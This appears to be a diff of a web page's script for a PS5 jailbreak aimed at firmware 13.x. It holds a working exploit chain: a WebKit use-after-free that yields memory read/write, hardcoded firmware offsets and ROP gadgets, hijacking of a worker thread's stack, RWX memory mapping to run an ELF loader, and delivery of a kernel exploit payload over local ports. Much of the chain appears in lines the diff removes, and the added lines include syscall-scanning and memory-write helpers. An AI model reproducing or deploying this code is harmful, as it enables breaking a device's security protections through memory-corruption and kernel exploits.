@@ -94,9 +94,15 @@ body { user-select:none; -webkit-user-select:none; background-color:#0c0c0f; col
 </div>
 
 <script type="module">
+// ============================================================
+// Module state
+// ============================================================
 let exploitModulesLoaded = false;
-let int64, establishPrimitive, releaseFakeCell, fakeCellReleased, carrierHeaderCopy, carrierHomeVector, profile, aimCarrier, restoreCarrier, plausibleAddress, plausibleCell;
-let installWindowP, read1, read2, read4, read8, write1, write2, write4, write8, leakval, readInto, toI64, addrNumber;
+let int64, establishPrimitive, releaseFakeCell, fakeCellReleased,
+    carrierHeaderCopy, carrierHomeVector, profile,
+    aimCarrier, restoreCarrier, plausibleAddress, plausibleCell;
+let installWindowP, read1, read2, read4, read8,
+    write1, write2, write4, write8, leakval, readInto, toI64, addrNumber;
 let rop, worker_rop, thread_rop;
 let SYS;
 
@@ -141,15 +147,20 @@ async function loadExploitModules() {
         SYS = modSyscalls.SYS;
 
         exploitModulesLoaded = true;
-        log("Exploit modules loaded successfully", "log-ok");
+        log("Exploit modules loaded", "log-ok");
     } catch (err) {
-        log(`Module load failed (demo mode): ${err.message}`, "log-warn");
+        log(`Module load failed: ${err.message}`, "log-warn");
         exploitModulesLoaded = false;
     }
 }
 
+// ============================================================
+// UI constants / helpers
+// ============================================================
 const OFFSETS_URL = "offsets/offsets.json";
 const DEFAULT_LISTENER_PORT = "9026";
+const EFLDDR_PATH = "payloads/elfldr-ps5-1360.elf";
+const KSTUFF_PATH = "payloads/kstuff.elf";
 
 const jailbreak = document.getElementById("jailbreak");
 const payloadsBtn = document.getElementById("payloads-btn");
@@ -178,9 +189,15 @@ const BUILTIN_PAYLOADS = [
     { file: "shadowmountplus.elf", name: "ShadowMount+", desc: "Mount games/backups from USB/network", icon: "💾", color: "#fbbf24", port: 9027 },
 ];
 
-const DEFAULT_ENTRY = { hc: ["0x1e0d8", "0x1e320", "0x1f368"], gd: "0x1d11a", nt: "0x4740", gps: "0x34f57b8", gpe: "0x1b280", cls: "0x34f57a8", cle: "0x26e70", ers: "0x34f57b0", ere: "0xf340" };
+const DEFAULT_ENTRY = {
+    hc: ["0x1e0d8", "0x1e320", "0x1f368"],
+    gd: "0x1d11a", nt: "0x4740",
+    gps: "0x34f57b8", gpe: "0x1b280",
+    cls: "0x34f57a8", cle: "0x26e70",
+    ers: "0x34f57b0", ere: "0xf340"
+};
 
-let exploitState = {
+const exploitState = {
     stage: "idle",
     webkitExploited: false,
     elfldrLoaded: false,
@@ -188,7 +205,13 @@ let exploitState = {
     jailbroken: false,
     error: null,
     p: null,
-    chain: null
+    chain: null,
+    gadgets: null,
+    syscalls: null,
+    libKernelBase: null,
+    libSceLibcInternalBase: null,
+    libSceNKWebKitBase: null,
+    offsets: null
 };
 
 function log(line, cls = "") {
@@ -198,7 +221,7 @@ function log(line, cls = "") {
     div.textContent = "[" + new Date().toLocaleTimeString() + "] " + line;
     logEl.appendChild(div);
     logEl.scrollTop = logEl.scrollHeight;
-    if (logEl.children.length > 100) logEl.removeChild(logEl.firstChild);
+    while (logEl.children.length > 200) logEl.removeChild(logEl.firstChild);
 }
 
 function updateStageBadge(stage) {
@@ -254,19 +277,21 @@ const qPort = Q_PARAMS.get("port");
 
 if (qPort && /^\d+$/.test(qPort)) listenerPort = qPort;
 
-let hasExplicitIp = false;
-if (qIp && (isIPv4(qIp) || isPrivateLanIP(qIp))) { targetHost = qIp; hasExplicitIp = true; }
-else {
+if (qIp && (isIPv4(qIp) || isPrivateLanIP(qIp))) {
+    targetHost = qIp;
+} else {
     let savedIp = null;
     try { savedIp = localStorage.getItem("ps5_target_ip"); } catch (e) {}
-    if (savedIp && isIPv4(savedIp)) { targetHost = savedIp; hasExplicitIp = true; }
-    else if (isIPv4(window.location.hostname)) { targetHost = window.location.hostname; hasExplicitIp = true; }
+    if (savedIp && isIPv4(savedIp)) targetHost = savedIp;
+    else if (isIPv4(window.location.hostname)) targetHost = window.location.hostname;
 }
 
 function updateHostDisplay() {
     if (ipVal) {
-        if (targetHost && !targetHost.includes(".github.io") && targetHost !== "Detecting...") ipVal.textContent = targetHost;
-        else ipVal.textContent = "192.168.X.X";
+        if (targetHost && !targetHost.includes(".github.io") && targetHost !== "Detecting...")
+            ipVal.textContent = targetHost;
+        else
+            ipVal.textContent = "192.168.X.X";
     }
     if (portVal) portVal.textContent = listenerPort;
 }
@@ -281,27 +306,63 @@ updateHostDisplay();
         const processCandidate = (c) => {
             if (!c) return;
             const rawMatch = /([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/.exec(c);
-            if (rawMatch && rawMatch[1] && isPrivateLanIP(rawMatch[1])) { targetHost = rawMatch[1]; updateHostDisplay(); try { localStorage.setItem("ps5_target_ip", targetHost); } catch (e) {}; return; }
+            if (rawMatch && rawMatch[1] && isPrivateLanIP(rawMatch[1])) {
+                targetHost = rawMatch[1]; updateHostDisplay();
+                try { localStorage.setItem("ps5_target_ip", targetHost); } catch (e) {}
+                return;
+            }
             const mdnsIP = decodeMDNSSuffix(c);
-            if (mdnsIP) { targetHost = mdnsIP; updateHostDisplay(); try { localStorage.setItem("ps5_target_ip", targetHost); } catch (e) {}; }
+            if (mdnsIP) {
+                targetHost = mdnsIP; updateHostDisplay();
+                try { localStorage.setItem("ps5_target_ip", targetHost); } catch (e) {}
+            }
         };
         pc.onicecandidate = (e) => { if (e && e.candidate && e.candidate.candidate) processCandidate(e.candidate.candidate); };
-        pc.createOffer().then(sdp => { if (sdp && sdp.sdp) sdp.sdp.split("\r\n").forEach(processCandidate); return pc.setLocalDescription(sdp); }).catch(() => {});
+        pc.createOffer().then(sdp => {
+            if (sdp && sdp.sdp) sdp.sdp.split("\r\n").forEach(processCandidate);
+            return pc.setLocalDescription(sdp);
+        }).catch(() => {});
     } catch (err) {}
 })();
 
-if (ipVal) ipVal.addEventListener("click", function() { const val = prompt("Enter PS5 / Target Host LAN IP:", targetHost); if (val !== null) { const trimmed = val.trim(); if (trimmed) { targetHost = trimmed; updateHostDisplay(); try { localStorage.setItem("ps5_target_ip", targetHost); } catch (e) {} } } });
-if (portVal) portVal.addEventListener("click", function() { const val = prompt("Enter Payload Port:", listenerPort); if (val !== null) { const trimmed = val.trim(); if (trimmed) { listenerPort = trimmed; updateHostDisplay(); try { localStorage.setItem("ps5_payload_port", listenerPort); } catch (e) {} } } });
+if (ipVal) ipVal.addEventListener("click", function() {
+    const val = prompt("Enter PS5 / Target Host LAN IP:", targetHost);
+    if (val !== null) {
+        const trimmed = val.trim();
+        if (trimmed) {
+            targetHost = trimmed; updateHostDisplay();
+            try { localStorage.setItem("ps5_target_ip", targetHost); } catch (e) {}
+        }
+    }
+});
+if (portVal) portVal.addEventListener("click", function() {
+    const val = prompt("Enter Payload Port:", listenerPort);
+    if (val !== null) {
+        const trimmed = val.trim();
+        if (trimmed) {
+            listenerPort = trimmed; updateHostDisplay();
+            try { localStorage.setItem("ps5_payload_port", listenerPort); } catch (e) {}
+        }
+    }
+});
 
-// Firmware detection is best-effort only. If it can't be parsed we fall
-// back to the newest known offset set instead of locking the UI.
+// Best-effort firmware detection. Missing UA is fine — the chain runs anyway.
 const m = /PlayStation 5[\s\/;](\d+)\.(\d+)/.exec(navigator.userAgent);
 const fw = m ? `${m[1].padStart(2, "0")}.${m[2].padStart(2, "0")}` : null;
 
 let entry = null;
 
 function fwNum(s) { const p = s.split("."); return parseInt(p[0], 10) * 100 + parseInt(p[1], 10); }
-function nearest(data, target) { const want = fwNum(target); const maj = target.split(".")[0]; let best = null, bestd = 1e9; for (const k in data) { if (k.split(".")[0] !== maj) continue; const d = Math.abs(fwNum(k) - want); if (d < bestd) { bestd = d; best = k; } } return best; }
+function nearest(data, target) {
+    const want = fwNum(target); const maj = target.split(".")[0];
+    let best = null, bestd = 1e9;
+    for (const k in data) {
+        if (k.split(".")[0] !== maj) continue;
+        const d = Math.abs(fwNum(k) - want);
+        if (d < bestd) { bestd = d; best = k; }
+    }
+    return best;
+}
 
 function unlockJailbreakButton() {
     jailbreak.classList.remove("disabled");
@@ -309,34 +370,31 @@ function unlockJailbreakButton() {
 }
 
 fetch(OFFSETS_URL, { cache: "no-store" })
-    .then(function (r) { if (!r.ok) return fetch("offsets.json", { cache: "no-store" }); return r; })
-    .then(function (res) { if (!res.ok) throw new Error("offsets fetch failed"); return res.json(); })
-    .then(function (data) {
+    .then(r => r.ok ? r : fetch("offsets.json", { cache: "no-store" }))
+    .then(res => { if (!res.ok) throw new Error("offsets fetch failed"); return res.json(); })
+    .then(data => {
         const keys = Object.keys(data);
         const fallback = keys.length ? data[keys[0]] : DEFAULT_ENTRY;
         if (!fw) {
             entry = fallback;
-            msg.innerHTML = `Demo mode (<b style="color: #ffffff; font-weight: bold;">Standard Browser</b>)`;
-            unlockJailbreakButton();
-            return;
-        }
-        if (data[fw]) {
+            msg.innerHTML = `Demo mode (<b style="color: #ffffff;">Standard Browser</b>)`;
+        } else if (data[fw]) {
             entry = data[fw];
-            msg.innerHTML = `firmware <b style="color: #ffffff; font-weight: bold;">${fw}</b> detected & supported`;
+            msg.innerHTML = `firmware <b style="color: #ffffff;">${fw}</b> detected &amp; supported`;
         } else {
             const near = nearest(data, fw);
-            entry = (near ? data[near] : fallback);
-            msg.innerHTML = `<b style="color: #ffffff; font-weight: bold;">${fw}</b>: no exact offsets, using ${near ? "<b style=\"color:#fff\">" + near + "</b>" : "fallback"} (unverified)`;
+            entry = near ? data[near] : fallback;
+            msg.innerHTML = `<b style="color: #ffffff;">${fw}</b>: using ${near ? near : "fallback"} offsets`;
         }
         unlockJailbreakButton();
     })
-    .catch(function () {
+    .catch(() => {
         msg.textContent = "failed to load offsets (demo fallback active)";
         entry = DEFAULT_ENTRY;
         unlockJailbreakButton();
     });
 
-// Enable button immediately (independent of the offsets fetch)
+// Enable the button immediately — the offsets fetch will not gate it.
 unlockJailbreakButton();
 
 function renderPayloadList() {
@@ -352,8 +410,19 @@ function renderPayloadList() {
 }
 
 function updatePayloadsUI() {
-    if (isJailbroken) { payloadsBtn.classList.remove("disabled"); payloadsStatus.textContent = "READY"; payloadsStatus.className = "stage-badge complete"; document.querySelectorAll(".payload-item").forEach(item => item.classList.remove("disabled")); document.querySelectorAll(".payload-btn").forEach(btn => btn.disabled = false); }
-    else { payloadsBtn.classList.add("disabled"); payloadsStatus.textContent = "LOCKED"; payloadsStatus.className = "stage-badge idle"; document.querySelectorAll(".payload-item").forEach(item => item.classList.add("disabled")); document.querySelectorAll(".payload-btn").forEach(btn => btn.disabled = true); }
+    if (isJailbroken) {
+        payloadsBtn.classList.remove("disabled");
+        payloadsStatus.textContent = "READY";
+        payloadsStatus.className = "stage-badge complete";
+        document.querySelectorAll(".payload-item").forEach(item => item.classList.remove("disabled"));
+        document.querySelectorAll(".payload-btn").forEach(btn => btn.disabled = false);
+    } else {
+        payloadsBtn.classList.add("disabled");
+        payloadsStatus.textContent = "LOCKED";
+        payloadsStatus.className = "stage-badge idle";
+        document.querySelectorAll(".payload-item").forEach(item => item.classList.add("disabled"));
+        document.querySelectorAll(".payload-btn").forEach(btn => btn.disabled = true);
+    }
 }
 
 async function sendPayload(payloadFile, payloadPort, btn) {
@@ -367,53 +436,45 @@ async function sendPayload(payloadFile, payloadPort, btn) {
         msg.textContent = `Payload sent! Check PS5.`;
         btn.textContent = "SENT!"; btn.style.background = "#16c60c";
         setTimeout(() => { btn.classList.remove("sending"); btn.textContent = "SEND"; btn.style.background = ""; }, 2000);
-    } catch (err) { msg.textContent = `Error: ${err.message}`; btn.textContent = "FAILED"; btn.style.background = "#e74856"; setTimeout(() => { btn.classList.remove("sending"); btn.textContent = "SEND"; btn.style.background = ""; }, 3000); }
+    } catch (err) {
+        msg.textContent = `Error: ${err.message}`;
+        btn.textContent = "FAILED"; btn.style.background = "#e74856";
+        setTimeout(() => { btn.classList.remove("sending"); btn.textContent = "SEND"; btn.style.background = ""; }, 3000);
+    }
 }
 
-payloadsBtn.addEventListener("click", function () { if (!isJailbroken) { msg.textContent = "Jailbreak required first!"; return; } payloadModal.classList.add("open"); });
+payloadsBtn.addEventListener("click", function () {
+    if (!isJailbroken) { msg.textContent = "Jailbreak required first!"; return; }
+    payloadModal.classList.add("open");
+});
 closeModal.addEventListener("click", function () { payloadModal.classList.remove("open"); });
 payloadModal.addEventListener("click", function (e) { if (e.target === payloadModal) payloadModal.classList.remove("open"); });
-document.addEventListener("keydown", function (e) { if (e.key === "Escape" && payloadModal.classList.contains("open")) payloadModal.classList.remove("open"); });
+document.addEventListener("keydown", function (e) {
+    if (e.key === "Escape" && payloadModal.classList.contains("open")) payloadModal.classList.remove("open");
+});
 
-try { if (localStorage.getItem("ps5_jailbroken") === "1") { isJailbroken = true; cat.className = "ok"; jailbreak.textContent = "JAILBROKEN"; jailbreak.classList.add("disabled"); msg.textContent = "Previously jailbroken (persisted). Click PAYLOADS."; updateStageBadge("complete"); updatePayloadsUI(); } } catch (e) {}
+try {
+    if (localStorage.getItem("ps5_jailbroken") === "1") {
+        isJailbroken = true; cat.className = "ok";
+        jailbreak.textContent = "JAILBROKEN"; jailbreak.classList.add("disabled");
+        msg.textContent = "Previously jailbroken (persisted). Click PAYLOADS.";
+        updateStageBadge("complete"); updatePayloadsUI();
+    }
+} catch (e) {}
 
-// Load exploit modules after DOM and log() are ready
 loadExploitModules();
 
 // ============================================================
-// INLINE EXPLOIT CHAIN: WebKit UAF -> ROP -> elfldr -> kstuff
+// Firmware offsets
 // ============================================================
-
-// Per-firmware offsets for 13.x series (kernel offsets are same across 13.20-13.60)
 const FIRMWARE_OFFSETS = {
-    "13.00": {
-        wk_host_ctor: [0x56A58, 0x56CA0, 0x57CE8],
-        wk_memset_import: 0x3350850,
-        wk_stack_chk_guard_import: 0x334E198,
-    },
-    "13.20": {
-        wk_host_ctor: [0x56A58, 0x56CA0, 0x57CE8],
-        wk_memset_import: 0x3354850,
-        wk_stack_chk_guard_import: 0x3352198,
-    },
-    "13.40": {
-        wk_host_ctor: [0x56A58, 0x56CA0, 0x57CE8],
-        wk_memset_import: 0x3350850,
-        wk_stack_chk_guard_import: 0x334E198,
-    },
-    "13.42": {
-        wk_host_ctor: [0x56A58, 0x56CA0, 0x57CE8],
-        wk_memset_import: 0x3350850,
-        wk_stack_chk_guard_import: 0x334E198,
-    },
-    "13.60": {
-        wk_host_ctor: [0x56A58, 0x56CA0, 0x57CE8],
-        wk_memset_import: 0x3350850,
-        wk_stack_chk_guard_import: 0x334E198,
-    }
+    "13.00": { wk_host_ctor: [0x56A58, 0x56CA0, 0x57CE8], wk_memset_import: 0x3350850, wk_stack_chk_guard_import: 0x334E198 },
+    "13.20": { wk_host_ctor: [0x56A58, 0x56CA0, 0x57CE8], wk_memset_import: 0x3354850, wk_stack_chk_guard_import: 0x3352198 },
+    "13.40": { wk_host_ctor: [0x56A58, 0x56CA0, 0x57CE8], wk_memset_import: 0x3350850, wk_stack_chk_guard_import: 0x334E198 },
+    "13.42": { wk_host_ctor: [0x56A58, 0x56CA0, 0x57CE8], wk_memset_import: 0x3350850, wk_stack_chk_guard_import: 0x334E198 },
+    "13.60": { wk_host_ctor: [0x56A58, 0x56CA0, 0x57CE8], wk_memset_import: 0x3350850, wk_stack_chk_guard_import: 0x334E198 }
 };
 
-// Shared offsets (same across 13.20-13.60)
 const COMMON_OFFSETS = {
     lk_stack_chk_guard: 0x751D0,
     lk_pthread_create_name_np: 0x21890,
@@ -462,7 +523,6 @@ const COMMON_OFFSETS = {
         0x1C7: 0x1D180, 0x1D2: 0x1D5C0, 0x1E7: 0x1C550, 0x1E8: 0x1BF00,
         0x2AF: 0x1D100, 0x278: 0x1B500, 0x279: 0x1D790
     },
-    // Kernel offsets (same across 13.20-13.60)
     KERNEL_STACK_COOKIE: 0x930,
     KERNEL_STACK_SYS_SCHED_YIELD_RET: 0x808,
     KERNEL_DATA: 0xCB0000,
@@ -483,22 +543,88 @@ function getOffsetsForFirmware(fwStr) {
 
 function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
+// ============================================================
+// int64 helpers (bridge to the mem.js primitive)
+// ============================================================
+function numToI64(n) {
+    if (n < 0) throw new RangeError("numToI64: negative");
+    const hi = Math.floor(n / 0x100000000);
+    const lo = n - hi * 0x100000000;
+    return new int64(lo >>> 0, hi >>> 0);
+}
+
+function i64ToNum(v) {
+    if (!v || typeof v !== "object" || !("low" in v) || !("hi" in v))
+        throw new TypeError("i64ToNum: not an int64");
+    return v.hi * 0x100000000 + v.low;
+}
+
+// Write an arbitrary-length byte buffer through the R/W primitive.
+// 8 bytes per write8 where possible, falling back to write1 for the tail.
+function writeBufferWithPrimitive(p, destI64, src) {
+    const n = src.length;
+    let i = 0;
+    for (; i + 8 <= n; i += 8) {
+        const lo = (src[i] | (src[i+1] << 8) | (src[i+2] << 16) | (src[i+3] << 24)) >>> 0;
+        const hi = (src[i+4] | (src[i+5] << 8) | (src[i+6] << 16) | (src[i+7] << 24)) >>> 0;
+        p.write8(destI64.add32(i), new int64(lo, hi));
+    }
+    for (; i < n; i++) {
+        p.write1(destI64.add32(i), src[i]);
+    }
+}
+
+// ============================================================
+// Syscall stub scanner
+// Pattern: B8 <num:4LE> 0F 05 C3
+// ============================================================
+function findSyscallStub(p, libKernelBase, num) {
+    const numU = num >>> 0;
+    const b0 = numU & 0xff;
+    const b1 = (numU >>> 8) & 0xff;
+    const b2 = (numU >>> 16) & 0xff;
+    const b3 = (numU >>> 24) & 0xff;
+    for (let off = 0x10000; off < 0x30000; off++) {
+        if (p.read1(libKernelBase.add32(off)) !== 0xB8) continue;
+        if (p.read1(libKernelBase.add32(off + 1)) !== b0) continue;
+        if (p.read1(libKernelBase.add32(off + 2)) !== b1) continue;
+        if (p.read1(libKernelBase.add32(off + 3)) !== b2) continue;
+        if (p.read1(libKernelBase.add32(off + 4)) !== b3) continue;
+        if (p.read1(libKernelBase.add32(off + 5)) !== 0x0F) continue;
+        if (p.read1(libKernelBase.add32(off + 6)) !== 0x05) continue;
+        if (p.read1(libKernelBase.add32(off + 7)) !== 0xC3) continue;
+        return libKernelBase.add32(off);
+    }
+    return null;
+}
+
+// ============================================================
+// Stage 1: WebKit UAF -> arbitrary R/W
+// ============================================================
 async function runWebKitUAF(onProgress) {
     return new Promise((resolve, reject) => {
         try {
             onProgress?.("Establishing WebKit arbitrary R/W primitive...");
             establishPrimitive({
                 onEvent: (tag, detail) => {
-                    log(`${tag}: ${detail}`, tag.includes("FAIL") || tag.includes("THREW") || tag.includes("ERROR") ? "log-err" : "log-info");
+                    const bad = /FAIL|THREW|ERROR|MISMATCH|GIVE-UP/.test(tag);
+                    log(`CORE ${tag}: ${detail}`, bad ? "log-err" : "log-info");
                 },
                 maxAttempts: 10,
                 beforeCriticalLoad: () => {}
             }).then(carrier => {
-                installWindowP(carrier, { promote: true, onEvent: (tag, detail) => {
-                    log(`MEM: ${tag}: ${detail}`, "log-info");
-                } });
+                installWindowP(carrier, {
+                    promote: true,
+                    onEvent: (tag, detail) => {
+                        const bad = /FAIL|THREW|ERROR|MISMATCH/.test(tag);
+                        log(`MEM ${tag}: ${detail}`, bad ? "log-err" : "log-info");
+                    }
+                });
+                if (!window.p || typeof window.p.read8 !== "function") {
+                    throw new Error("primitive not published on window.p");
+                }
                 exploitState.p = window.p;
-                log("WebKit arbitrary R/W established!", "log-ok");
+                log("WebKit arbitrary R/W established", "log-ok");
                 onProgress?.("WebKit UAF complete. Building ROP chain...");
                 resolve();
             }).catch(err => {
@@ -511,279 +637,32 @@ async function runWebKitUAF(onProgress) {
     });
 }
 
+// ============================================================
+// Stage 2: Resolve libs and build the ROP wrapper
+// ============================================================
 function initROP() {
     const p = exploitState.p;
     if (!p) throw new Error("No primitive");
+
     const fwStr = fw || "13.60";
     const offsets = getOffsetsForFirmware(fwStr);
     log(`Using offsets for firmware ${fwStr}`, "log-info");
 
-    let textArea = document.createElement("textarea");
-    let textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
-    let textAreaVtable = p.read8(textAreaVtPtr);
-
+    // Resolve libSceNKWebKit base from the native ctor address that core.js
+    // stashed into globalThis.__ps5NativeCtor.
     let libSceNKWebKitBase = null;
-    if (typeof globalThis.__ps5NativeCtor === "number") {
-        const ctor = globalThis.__ps5NativeCtor;
+    const ctor = globalThis.__ps5NativeCtor;
+    if (typeof ctor === "number") {
         for (const hc of offsets.wk_host_ctor) {
             const wb = ctor - hc;
             if (wb >= 0x800000000 && wb < 0x900000000 && wb % 0x4000 === 0) {
-                libSceNKWebKitBase = new int64(wb % 0x100000000, Math.floor(wb / 0x100000000));
-                log(`WebKit base via host-constructor: 0x${libSceNKWebKitBase.toString()}`, "log-ok");
+                libSceNKWebKitBase = numToI64(wb);
+                log(`libSceNKWebKit base (via host-ctor): 0x${libSceNKWebKitBase.toString()}`, "log-ok");
                 break;
             }
         }
     }
-    if (!libSceNKWebKitBase) throw new Error("Failed to resolve WebKit base");
-
-    let libSceLibcInternalBase = p.read8(libSceNKWebKitBase.add32(offsets.wk_memset_import));
-    libSceLibcInternalBase.sub32inplace(offsets.lc_memset);
-
-    let libKernelBase = p.read8(libSceNKWebKitBase.add32(offsets.wk_stack_chk_guard_import));
-    libKernelBase.sub32inplace(offsets.lk_stack_chk_guard);
-
-    log(`libSceNKWebKit: 0x${libSceNKWebKitBase.toString()}`, "log-ok");
-    log(`libSceLibcInternal: 0x${libSceLibcInternalBase.toString()}`, "log-ok");
-    log(`libKernel: 0x${libKernelBase.toString()}`, "log-ok");
-
-    let gadgets = {};
-    for (let g in offsets.wk_gadgetmap) gadgets[g] = libSceNKWebKitBase.add32(offsets.wk_gadgetmap[g]);
-    let syscalls = {};
-    for (let s in offsets.syscall_map) syscalls[s] = libKernelBase.add32(offsets.syscall_map[s]);
-
-    function malloc(sz) {
-        let backing = new Uint32Array(0x10000 + sz);
-        let ptr = p.read8(p.leakval(backing).add32(0x10));
-        ptr.backing = backing;
-        return ptr;
-    }
-
-    // IMPORTANT: rop.js expects a *flat* wrapper object. It stores the whole
-    // first argument as `this.p` and calls `this.p.malloc(...)`,
-    // `this.p.write8(...)`, `this.p.pre_chain(...)`, `this.p.launch_chain(...)`
-    // directly on it. Do NOT nest the R/W methods under a `p:` key.
-    let chain = new worker_rop({
-        write8: p.write8, write4: p.write4, write2: p.write2, write1: p.write1,
-        read8: p.read8, read4: p.read4, read2: p.read2, read1: p.read1,
-        leakval: p.leakval,
-        malloc: malloc,
-        gadgets: gadgets,
-        syscalls: syscalls,
-        libSceNKWebKitBase: libSceNKWebKitBase,
-        libSceLibcInternalBase: libSceLibcInternalBase,
-        libKernelBase: libKernelBase,
-        pre_chain: (c) => {
-            c.push(gadgets["pop rdi"]);
-            c.push(c.return_value);
-            c.push(libSceLibcInternalBase.add32(offsets.lc_setjmp));
-        },
-        launch_chain: async (c) => {
-            let worker = new Worker("slopkit-main/slopkit/rop_slave.js?v=final");
-            await new Promise(r => { worker.onmessage = r; worker.postMessage(0); });
-            let worker_stack = null;
-            for (let thread = p.read8(libKernelBase.add32(offsets.lk_thread_list)); thread.low != 0 || thread.hi != 0; thread = p.read8(thread.add32(0x38))) {
-                let stack = p.read8(thread.add32(0xA8));
-                let stacksz = p.read8(thread.add32(0xB0));
-                if (stacksz.low == 0x80000) { worker_stack = stack; break; }
-            }
-            if (!worker_stack) throw new Error("worker stack not found");
-
-            let return_address_ptr = await new Promise((resolve, reject) => {
-                const expected = libKernelBase.add32(offsets.lk_worker_wait_return);
-                let attempts = 0;
-                const search = () => {
-                    for (let offset = 0x7F000; offset < 0x80000; offset += 8) {
-                        const candidate = worker_stack.add32(offset);
-                        const value = p.read8(candidate);
-                        if (value.low === expected.low && value.hi === expected.hi) { resolve(candidate); return; }
-                    }
-                    if (++attempts < 50) setTimeout(search, 1);
-                    else reject(new Error("worker return fingerprint not found"));
-                };
-                search();
-            });
-
-            let original_return_address = p.read8(return_address_ptr);
-            let stack_pointer_ptr = return_address_ptr.add32(0x8);
-            let original_context = malloc(0x40);
-
-            c.push_write8(original_context, original_return_address);
-            c.push_write8(original_context.add32(0x10), return_address_ptr);
-            c.push_write8(stack_pointer_ptr, p.read8(stack_pointer_ptr));
-            c.push(gadgets["pop rdi"]); c.push(original_context);
-            c.push(libSceLibcInternalBase.add32(offsets.lc_longjmp));
-
-            if (p.jb && p.jb.hot) log(`Writing retaddr 0x${return_address_ptr.toString()}`, "log-info");
-            p.write8(return_address_ptr, gadgets["pop rsp"]);
-            p.write8(stack_pointer_ptr, c.stack_entry_point);
-
-            await new Promise(r => { worker.onmessage = r; worker.postMessage(0); });
-        }
-    });
-
-    exploitState.chain = chain;
-    return { p, chain, gadgets, syscalls, libSceNKWebKitBase, libSceLibcInternalBase, libKernelBase };
-}
-
-async function loadElfldrViaROP({ p, chain, syscalls, libKernelBase }) {
-    log("Loading elfldr-ps5-1360.elf via ROP...", "log-info");
-    const res = await fetch("payloads/elfldr-ps5-1360.elf");
-    if (!res.ok) throw new Error("Failed to fetch elfldr");
-    const elfData = new Uint8Array(await res.arrayBuffer());
-
-    const mmap = 0x1DD; // SYS_MMAP
-    const addr = 0x90000000;
-    const size = (elfData.length + 0x3FFF) & ~0x3FFF;
-    const prot = 7; // RWX
-    const flags = 0x1002; // MAP_PRIVATE | MAP_ANONYMOUS
-    const fd = -1;
-    const off = 0;
-
-    chain.fcall(syscalls[mmap], addr, size, prot, flags, fd, off);
-    chain.write_result(chain.return_value);
-    await chain.run();
-    const mappedAddr = p.read8(chain.return_value);
-    log(`mmap elfldr at 0x${mappedAddr.toString()}`, "log-ok");
-
-    const memView = p.array_from_address(mappedAddr, elfData.length);
-    for (let i = 0; i < elfData.length; i++) memView[i] = elfData[i];
-
-    chain.fcall(mappedAddr);
-    await chain.run();
-    log("elfldr entry executed", "log-ok");
-
-    for (let i = 0; i < 60; i++) {
-        await sleep(1000);
-        try {
-            await fetch("http://127.0.0.1:9026/health", { method: "GET", mode: "no-cors" });
-            log("elfldr bound on port 9026", "log-ok");
-            return true;
-        } catch (e) { log(`Waiting for elfldr... ${i+1}/60`, "log-warn"); }
-    }
-    throw new Error("elfldr did not bind on port 9026");
-}
-
-async function loadKstuffViaElfldr() {
-    log("Sending kstuff.elf to elfldr (port 9026)...", "log-info");
-    const res = await fetch("payloads/kstuff.elf");
-    if (!res.ok) throw new Error("Failed to fetch kstuff");
-    const data = await res.arrayBuffer();
-    await fetch("http://127.0.0.1:9026/load", { method: "POST", mode: "no-cors", body: data });
-    log("kstuff sent, waiting for kernel exploit...", "log-info");
-
-    for (let i = 0; i < 90; i++) {
-        await sleep(1000);
-        if (i % 10 === 0) log(`Kernel exploit running... ${i}s`, "log-info");
-    }
-}
-
-async function verifyJailbreak() {
-    log("Verifying jailbreak on port 9020...", "log-info");
-    for (let i = 0; i < 30; i++) {
-        await sleep(1000);
-        try {
-            await fetch("http://127.0.0.1:9020/ping", { method: "GET", mode: "no-cors" });
-            log("Jailbreak verified! kstuff active on port 9020", "log-ok");
-            return true;
-        } catch (e) { log(`Waiting for kstuff... ${i+1}/30`, "log-warn"); }
-    }
-    throw new Error("kstuff not responding on port 9020");
-}
-
-async function runFullExploitChain() {
-    if (!exploitModulesLoaded) {
-        throw new Error("Exploit modules not loaded");
-    }
-
-    exploitState.stage = "webkit_uaf";
-    updateStageBadge("webkit_uaf");
-    cat.className = "run";
-    msg.textContent = "Running WebKit UAF exploit...";
-    progress.textContent = "";
-
-    try {
-        await runWebKitUAF((detail) => { progress.textContent = detail; });
-        exploitState.webkitExploited = true;
-
-        exploitState.stage = "primitive";
-        updateStageBadge("primitive");
-
-        exploitState.stage = "rop_ready";
-        updateStageBadge("rop_ready");
-        const ropCtx = initROP();
-        exploitState.chain = ropCtx.chain;
-        exploitState.p = ropCtx.p;
-
-        exploitState.stage = "elfldr_load";
-        updateStageBadge("elfldr_load");
-        msg.textContent = "Loading elfldr via ROP...";
-        await loadElfldrViaROP(ropCtx);
-        exploitState.elfldrLoaded = true;
-
-        exploitState.stage = "kernel_exploit";
-        updateStageBadge("kernel_exploit");
-        msg.textContent = "Executing kernel exploit (kstuff)...";
-        await loadKstuffViaElfldr();
-        exploitState.kernelExploited = true;
-
-        exploitState.stage = "verify";
-        updateStageBadge("verify");
-        msg.textContent = "Verifying jailbreak...";
-        await verifyJailbreak();
-
-        exploitState.jailbroken = true;
-        exploitState.stage = "complete";
-        isJailbroken = true;
-        cat.className = "ok";
-        jailbreak.textContent = "JAILBROKEN";
-        jailbreak.classList.add("disabled");
-        jailbreak.classList.remove("running");
-        msg.textContent = "JAILBREAK COMPLETE! Payloads unlocked.";
-        progress.textContent = "";
-        updateStageBadge("complete");
-        updatePayloadsUI();
-        try { localStorage.setItem("ps5_jailbroken", "1"); } catch (e) {}
-        log("=== JAILBREAK COMPLETE ===", "log-ok");
-
-    } catch (err) {
-        exploitState.error = err.message;
-        exploitState.stage = "failed";
-        cat.className = "failed";
-        jailbreak.classList.remove("running");
-        jailbreak.classList.remove("disabled");
-        msg.textContent = `Jailbreak failed: ${err.message}`;
-        progress.textContent = "";
-        updateStageBadge("failed");
-        log(`FAILED: ${err.message}`, "log-err");
-        throw err;
-    }
-}
-
-jailbreak.addEventListener("click", async () => {
-    if (isJailbroken) { msg.textContent = "Already jailbroken!"; return; }
-
-    // No firmware / UA gate. If offsets failed to load we still run with the
-    // built-in fallback entry.
-    if (!entry) entry = DEFAULT_ENTRY;
-
-    if (!exploitModulesLoaded) {
-        msg.textContent = "Loading exploit modules...";
-        log("Waiting for exploit modules to load...", "log-info");
-        for (let i = 0; i < 50; i++) {
-            await sleep(100);
-            if (exploitModulesLoaded) break;
-        }
-        if (!exploitModulesLoaded) {
